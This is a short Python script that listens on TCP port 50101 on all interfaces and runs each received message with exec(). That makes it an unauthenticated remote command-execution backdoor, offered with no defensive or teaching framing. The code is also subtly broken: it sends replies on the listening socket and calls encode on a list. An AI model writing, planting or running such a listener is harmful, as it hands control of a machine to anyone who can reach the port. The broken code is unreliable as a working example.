import socket

### Create TCP/IP Socket ###
tunnel = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

### Bind Socket to Port ###
server = ((socket.gethostbyname('0.0.0.0')),50101)
tunnel.bind(server)

### Listen for incoming connections ###
tunnel.listen(5)

while True:
    connection, client_address = tunnel.accept()
    try:
        ### Receive data in 1024 byte packages and execute commands ###
        while True:
            data = connection.recv(1024)
            if data:
                data = data.decode()
                try:
                    global status
                    status = []
                    exec(data)
                    tunnel.sendall(status.encode())
                except:
                    break
            else:
                break
    finally:
        connection.close()
